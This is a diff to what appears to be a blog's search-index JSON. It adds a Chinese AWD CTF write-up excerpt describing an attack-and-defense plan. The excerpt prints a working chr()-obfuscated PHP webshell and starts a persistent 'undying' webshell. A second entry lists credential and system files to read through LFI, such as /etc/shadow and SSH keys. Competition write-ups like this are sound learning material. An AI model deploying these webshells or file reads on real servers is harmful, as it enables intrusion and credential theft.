@@ -65,6 +65,12 @@ var store = [{
         "url": "/tricks/crontab/",
         "teaser": null
       },{
+        "title": "2020河北省赛线下经验总结",
+        "excerpt":"0x00 写在前面 这是在比赛开始之前，分工后自己简单写的一个比赛思路。 1. 修改ssh {passwd} &amp;&amp; 修改mysql{set password = password('password');} 2. 备份源码 3. 扫描源码 4. 简单审计 上waf 删除一句话 删站观察是否check 5. 利用一句话去打别人 流量混淆 webshell混淆 权限维持 6. （主机发现） 7. 提权 办ip 修改php.ini禁用危险函数 8. 目录扫描 漏洞挖掘 0x01 开干 SSH连上之后，居然发现自己是root！因为于是我找到php配置文件 php.ini，禁用了一些危险函数，上完 waf之后就开始攻击别的队伍了。 很快找到了一个文件上传漏洞，很快上传了一个webshell，密码是yueyejian &lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(39).$_uU(121).$_uU(117).$_uU(101).$_uU(121).$_uU(101).$_uU(106).$_uU(105).$_uU(97).$_uU(110).$_uU(39).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(\"\",$_cC);@$_();?&gt; 然后再网站主页上传了内存木马俗称不死马，会自动生成上面内容的webshell &lt;?php ignore_user_abort(true); set_time_limit(0); $file = 'webshell.php'; $code...","categories": ["tricks"],
+        "tags": ["awd"],
+        "url": "/tricks/awd/",
+        "teaser": null
+      },{
         "title": "LFI - 可利用敏感文件",
         "excerpt":"windows C:\\boot.ini //查看系统版本 C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\Windows\\repair\\sam //存储系统初次安装的密码 C:\\Program Files\\mysql\\my.ini //Mysql配置 C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php配置信息 C:\\Windows\\my.ini //Mysql配置信息 linux /etc/passwd /etc/shadow /etc/hosts /root/.bash_history //root的bash历史记录 /root/.ssh/authorized_keys /root/.mysql_history //mysql的bash历史记录 /root/.wget-hsts /opt/nginx/conf/nginx.conf //nginx的配置文件 /var/www/html/index.html /etc/my.cnf /etc/httpd/conf/httpd.conf //httpd的配置文件 /proc/self/fd/fd[0-9]*(文件标识符) /proc/mounts /porc/config.gz /proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用 /proc/mounts // 挂载的文件系统列表 /proc/net/arp //arp表，可以获得内网其他机器的地址 /proc/net/route //路由表信息 /proc/net/tcp and /proc/net/udp...","categories": ["tricks"],
         "tags": ["lfi","windows","linux"],
